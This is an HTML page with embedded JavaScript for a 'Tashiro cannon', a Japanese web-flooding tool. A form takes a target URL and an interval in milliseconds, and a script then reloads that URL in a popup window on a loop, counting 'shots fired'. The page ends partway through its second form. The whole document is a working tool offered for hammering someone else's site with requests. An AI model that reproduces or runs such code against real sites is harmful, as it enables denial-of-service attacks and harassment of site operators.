    <body text="#000000" bgcolor="#FFFFFF">
        <div align="center">
            <script>
            var wind = "";
            var add = "";
            var timeid = "";
            
            function display(qq) {
                clearTimeout(timeid);
                if (qq != 0) {
                    add = f.address.value;
                    wind = window.open(add, 'san', 'width=400, height=400');
                    tashiro();
                }
                if (qq == 0) {
                    f.fired.value = "0";
                    wind.close();
                }
            }
            
            function tashiro() {
                wind.location = add;
                f.fired.value++;
                timeid = setTimeout("tashiro();", f.inter.value);
            }
            </script>
            <font color="#000000" size="5"><b><u>超田代砲改 Ver.1.3 プチ改造大東亜共栄砲</u></b></font> <BR><BR>
            <form name="f">
                <font color="#000000">目標アドレス:</font><br>
                <input size="100" value="ここに目標URLを入れる" name="address"><br><br>
                <font color="#000000">砲撃間隔:</font><br>
                <input size="5" value="200" name="inter">ミリ秒<BR><br>
                <font color="#000000">既砲撃回数:</font><br>
                <input value="0" name="fired"><br>
                <input onclick="display(1)" type="button" value="砲撃開始">
            </form>
            <form>
                <input onclick="display(0)" type="button" value="砲撃終了">
